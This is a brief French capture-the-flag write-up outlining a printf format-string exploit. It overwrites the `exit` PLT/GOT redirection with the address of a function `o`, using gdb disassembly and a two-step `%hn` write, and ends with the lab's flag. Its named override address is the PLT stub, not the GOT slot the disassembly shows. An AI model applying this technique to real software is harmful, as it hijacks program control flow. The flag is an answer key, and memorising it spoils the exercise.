1. On va encore une fois utiliser le même principe (exploit via printf). Mais cette fois on doit override une adresse pointant sur une fonction de la libc à savoir `exit` pour qu'elle pointe sur la fonction `o` à la place.
   - Adresse à override : 0x080483d0
     ```
     (gdb) disas n
     [...]
     0x080484ff <+61>:	call   0x80483d0 <exit@plt>

     (gdb) disas 0x80483d0
     Dump of assembler code for function exit@plt:
         0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
	 0x080483d6 <+6>:	push   0x28
	 0x080483db <+11>:	jmp    0x8048370
     ```
   - A remplacer par : 0x080484a4
     ```
     (gdb) disas o
     Dump of assembler code for function o:
         0x080484a4 <+0>:	push   ebp
     [...]
     ```
2. On va modifier le pointeur en deux étapes à l'aide du modifier `%hn`
3. On écrit l'exploit

> Flag: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
